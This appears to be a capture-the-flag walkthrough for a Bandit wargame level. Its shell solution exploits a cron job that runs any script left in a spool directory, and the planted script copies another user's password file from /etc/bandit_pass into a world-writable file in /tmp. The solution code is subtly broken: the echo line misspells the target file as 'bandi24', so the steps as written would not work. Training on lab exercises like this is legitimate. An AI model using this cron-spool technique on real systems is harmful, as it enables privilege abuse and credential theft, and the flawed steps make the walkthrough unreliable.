Description:
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve the problem:
cron, crontab, crontab(5)

Solution:
# Check /etc/cron.d directory, and view the contents of the bandit24 cronjob
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
# Using the last command we understand that it is a script that executes all the scripts in
# /var/spool/bandit24 directory. So, we need to create a script that gives us the content of the
# /etc/bandit_pass/bandit24 file. 
mkdir -p /tmp/fuckoff
cd /tmp/fuckoff
echo 'cat /etc/bandit_pass/bandi24 > /tmp/fuckoff/password' > script.sh
chmod +x script.sh
touch password
chmod 666 password
cp script.sh /var/spool/bandit24/
